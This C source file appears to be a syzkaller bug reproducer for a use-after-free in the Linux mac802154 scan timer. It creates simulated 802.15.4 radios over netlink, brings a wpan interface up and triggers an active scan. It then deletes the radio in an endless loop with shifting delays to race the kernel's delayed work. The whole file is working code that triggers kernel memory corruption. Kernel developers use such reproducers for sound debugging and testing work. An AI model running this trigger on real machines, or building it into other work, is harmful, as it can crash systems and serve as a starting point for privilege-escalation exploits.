// https://syzkaller.appspot.com/bug?id=84a31e74f2d0c2aeb5a7d6ec53f1e3d3330a14b3
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/netlink.h>
#include <linux/genetlink.h>
#include <stdint.h>

#define NLMSG_ALIGNTO 4U
#define NLMSG_ALIGN(len) (((len) + NLMSG_ALIGNTO - 1) & ~(NLMSG_ALIGNTO - 1))
#define NLMSG_HDRLEN NLMSG_ALIGN(sizeof(struct nlmsghdr))

#define CTRL_CMD_GETFAMILY 3
#define CTRL_ATTR_FAMILY_ID 1
#define CTRL_ATTR_FAMILY_NAME 2

#define MAC802154_HWSIM_CMD_NEW_RADIO 3
#define MAC802154_HWSIM_CMD_DEL_RADIO 4
#define MAC802154_HWSIM_ATTR_RADIO_ID 1

#define NL802154_CMD_TRIGGER_SCAN 35
#define NL802154_ATTR_IFINDEX 3
#define NL802154_ATTR_SCAN_TYPE 31
#define NL802154_ATTR_SCAN_CHANNELS 33
#define NL802154_ATTR_SCAN_DURATION 36
#define NL802154_SCAN_ACTIVE 2 // FIXED: Must be 2, not 1

struct nl_msg {
    struct nlmsghdr nlh;
    struct genlmsghdr gnlh;
    char buf[1024];
};

void add_attr(struct nl_msg *msg, int type, const void *data, int len) {
    int aligned_len = (len + 3) & ~3;
    struct nlattr *attr = (struct nlattr *)((char *)msg + msg->nlh.nlmsg_len);
    attr->nla_type = type;
    attr->nla_len = 4 + len;
    memcpy((char *)attr + 4, data, len);
    memset((char *)attr + 4 + len, 0, aligned_len - len);
    msg->nlh.nlmsg_len += 4 + aligned_len;
}

int get_family_id(const char *name) {
    struct nl_msg msg = {0};
    msg.nlh.nlmsg_len = sizeof(struct nlmsghdr) + sizeof(struct genlmsghdr);
    msg.nlh.nlmsg_type = GENL_ID_CTRL;
    msg.nlh.nlmsg_flags = NLM_F_REQUEST;
    msg.nlh.nlmsg_seq = 1;
    msg.gnlh.cmd = CTRL_CMD_GETFAMILY;
    msg.gnlh.version = 1;
    
    add_attr(&msg, CTRL_ATTR_FAMILY_NAME, name, strlen(name) + 1);
    
    int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
    if (fd < 0) return -1;
    
    if (send(fd, &msg, msg.nlh.nlmsg_len, 0) < 0) {
        close(fd);
        return -1;
    }
    
    char resp[4096];
    int len = recv(fd, resp, sizeof(resp), 0);
    close(fd);
    
    if (len < 0) return -1;
    
    struct nlmsghdr *nlh = (struct nlmsghdr *)resp;
    if (nlh->nlmsg_type == NLMSG_ERROR) return -1;
    
    struct genlmsghdr *gnlh = (struct genlmsghdr *)((char *)nlh + NLMSG_HDRLEN);
    struct nlattr *attr = (struct nlattr *)((char *)gnlh + sizeof(struct genlmsghdr));
    int rem = nlh->nlmsg_len - NLMSG_HDRLEN - sizeof(struct genlmsghdr);
    
    while (rem >= (int)sizeof(struct nlattr)) {
        if (attr->nla_type == CTRL_ATTR_FAMILY_ID) {
            return *(uint16_t *)((char *)attr + 4);
        }
        int aligned_len = (attr->nla_len + 3) & ~3;
        rem -= aligned_len;
        attr = (struct nlattr *)((char *)attr + aligned_len);
    }
    return -1;
}

int create_radio(int family_id, uint32_t *radio_id) {
    struct nl_msg msg = {0};
    msg.nlh.nlmsg_len = sizeof(struct nlmsghdr) + sizeof(struct genlmsghdr);
    msg.nlh.nlmsg_type = family_id;
    msg.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    msg.nlh.nlmsg_seq = 2;
    msg.gnlh.cmd = MAC802154_HWSIM_CMD_NEW_RADIO;
    msg.gnlh.version = 1;
    
    int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
    if (fd < 0) return -1;
    if (send(fd, &msg, msg.nlh.nlmsg_len, 0) < 0) {
        close(fd);
        return -1;
    }
    
    char resp[4096];
    int len = recv(fd, resp, sizeof(resp), 0);
    close(fd);
    
    if (len < 0) return -1;
    
    struct nlmsghdr *nlh = (struct nlmsghdr *)resp;
    if (nlh->nlmsg_type == NLMSG_ERROR) {
        struct nlmsgerr *err = (struct nlmsgerr *)((char *)nlh + NLMSG_HDRLEN);
        if (err->error >= 0) {
            *radio_id = err->error;
            return 0;
        }
    }
    return -1;
}

void delete_radio(int family_id, uint32_t radio_id) {
    struct nl_msg msg = {0};
    msg.nlh.nlmsg_len = sizeof(struct nlmsghdr) + sizeof(struct genlmsghdr);
    msg.nlh.nlmsg_type = family_id;
    msg.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    msg.nlh.nlmsg_seq = 3;
    msg.gnlh.cmd = MAC802154_HWSIM_CMD_DEL_RADIO;
    msg.gnlh.version = 1;
    
    add_attr(&msg, MAC802154_HWSIM_ATTR_RADIO_ID, &radio_id, sizeof(radio_id));
    
    int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
    if (fd >= 0) {
        send(fd, &msg, msg.nlh.nlmsg_len, 0);
        char resp[4096];
        recv(fd, resp, sizeof(resp), 0);
        close(fd);
    }
}

void trigger_scan(int family_id, uint32_t ifindex) {
    struct nl_msg msg = {0};
    msg.nlh.nlmsg_len = sizeof(struct nlmsghdr) + sizeof(struct genlmsghdr);
    msg.nlh.nlmsg_type = family_id;
    msg.nlh.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    msg.nlh.nlmsg_seq = 4;
    msg.gnlh.cmd = NL802154_CMD_TRIGGER_SCAN;
    msg.gnlh.version = 1;
    
    add_attr(&msg, NL802154_ATTR_IFINDEX, &ifindex, sizeof(ifindex));
    uint8_t scan_type = NL802154_SCAN_ACTIVE;
    add_attr(&msg, NL802154_ATTR_SCAN_TYPE, &scan_type, sizeof(scan_type));
    
    uint32_t scan_channels = 1; // Channel 0
    add_attr(&msg, NL802154_ATTR_SCAN_CHANNELS, &scan_channels, sizeof(scan_channels));
    
    uint8_t scan_duration = 0; // 0 duration
    add_attr(&msg, NL802154_ATTR_SCAN_DURATION, &scan_duration, sizeof(scan_duration));
    
    int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
    if (fd >= 0) {
        send(fd, &msg, msg.nlh.nlmsg_len, 0);
        char resp[4096];
        recv(fd, resp, sizeof(resp), 0);
        close(fd);
    }
}

int main() {
    printf("[*] Starting mac802154 timer UAF reproducer...\n");
    
    int family_hwsim = get_family_id("MAC802154_HWSIM");
    if (family_hwsim < 0) {
        printf("[-] Failed to get MAC802154_HWSIM family ID.\n");
        exit(1);
    }
    printf("[+] MAC802154_HWSIM family ID: %d\n", family_hwsim);
    
    int family_nl802154 = get_family_id("nl802154");
    if (family_nl802154 < 0) {
        printf("[-] Failed to get nl802154 family ID.\n");
        exit(1);
    }
    printf("[+] nl802154 family ID: %d\n", family_nl802154);
    
    // Delete default radios 0 and 1 just in case
    delete_radio(family_hwsim, 0);
    delete_radio(family_hwsim, 1);
    
    int delay = 0;
    
    while (1) {
        uint32_t radio_id = 0;
        if (create_radio(family_hwsim, &radio_id) < 0) {
            printf("[-] Failed to create radio\n");
            usleep(100000);
            continue;
        }
        
        char wpan_name[16] = {0};
        int wpan_ifindex = 0;
        for (int i = 0; i < 100; i++) {
            struct if_nameindex *if_ni, *i_ni;
            if_ni = if_nameindex();
            if (if_ni) {
                for (i_ni = if_ni; i_ni->if_index != 0 || i_ni->if_name != NULL; i_ni++) {
                    if (strncmp(i_ni->if_name, "wpan", 4) == 0) {
                        int fd = socket(AF_INET, SOCK_DGRAM, 0);
                        struct ifreq ifr = {0};
                        strcpy(ifr.ifr_name, i_ni->if_name);
                        ioctl(fd, SIOCGIFFLAGS, &ifr);
                        close(fd);
                        if (!(ifr.ifr_flags & IFF_UP)) {
                            wpan_ifindex = i_ni->if_index;
                            strcpy(wpan_name, i_ni->if_name);
                            break;
                        }
                    }
                }
                if_freenameindex(if_ni);
            }
            if (wpan_ifindex > 0) break;
            usleep(10000);
        }
        
        if (wpan_ifindex == 0) {
            printf("[-] Failed to find wpan interface\n");
            delete_radio(family_hwsim, radio_id);
            continue;
        }
        
        // Bring up
        int fd = socket(AF_INET, SOCK_DGRAM, 0);
        struct ifreq ifr = {0};
        strcpy(ifr.ifr_name, wpan_name);
        ioctl(fd, SIOCGIFFLAGS, &ifr);
        ifr.ifr_flags |= IFF_UP;
        if (ioctl(fd, SIOCSIFFLAGS, &ifr) < 0) {
            printf("[-] Failed to bring %s up: %s\n", wpan_name, strerror(errno));
            close(fd);
            delete_radio(family_hwsim, radio_id);
            continue;
        }
        close(fd);
        
        // Trigger scan
        trigger_scan(family_nl802154, wpan_ifindex);
        
        // Wait a bit to race with scan worker
        if (delay > 0) usleep(delay);
        
        // Delete radio
        delete_radio(family_hwsim, radio_id);
        
        // Wait for wpanX to disappear
        for (int i = 0; i < 100; i++) {
            if (if_nametoindex(wpan_name) == 0) {
                break;
            }
            usleep(10000);
        }
        
        // Wait for 50ms to allow the 30ms delayed work timer to fire
        usleep(50000);
        
        delay += 50;
        if (delay > 2000) delay = 0;
        
        printf("[+] Iteration complete, delay=%d\n", delay);
    }
    
    return 0;
}
